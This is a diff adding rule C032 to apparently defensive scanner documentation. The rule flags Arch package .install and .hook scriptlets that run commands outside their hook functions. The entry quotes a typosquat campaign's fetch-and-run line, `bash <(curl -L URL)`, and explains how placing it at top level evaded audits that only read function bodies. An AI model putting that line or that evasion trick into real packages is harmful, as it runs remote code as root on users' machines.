@@ -340,6 +340,30 @@ declaration is the attack's committed form, while a declaration moving to
 an existing script is weaker (the script may predate the diff) and reads
 as MEDIUM.
 
+### C032: Scriptlet Executes Commands At Top Level {#c032}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `install-and-persist`
+- **Condition:** A committed `.install` or alpm `.hook` scriptlet executes
+  a command outside every hook function.
+
+pacman sources the scriptlet for each operation, so a top-level line runs
+as root on every invocation, including ones an install-time audit of
+`post_install()` never sees. The yay typosquat campaign (yyay, yaay,
+yayy) shipped its payload this way: the hook functions were inert and a
+bare `bash <(curl -L URL)` sat after them, invisible to every rule that
+reads function bodies.
+
+The rule reads the committed file's text, tracks brace depth so function
+bodies are excluded, and matches command-position interpreters, `source`,
+`.`, `eval` and `make -f` on what remains. Top-level assignments,
+comments and function headers match nothing. A file that does not parse
+as a whole scriptlet stands the rule down, the same stand-down C016 makes
+for partial reads: a head cut by the manifest byte budget is reported as
+an incomplete examination, never read as a complete one. When the same
+line also fetches (the campaign line does), H090 claims the finding and
+C032 yields, so one piece of evidence never scores twice.
+
 ### C017: Install Hook Writes To A User-Writable Location {#c017}
 
 - **Severity:** HIGH (weight 25)
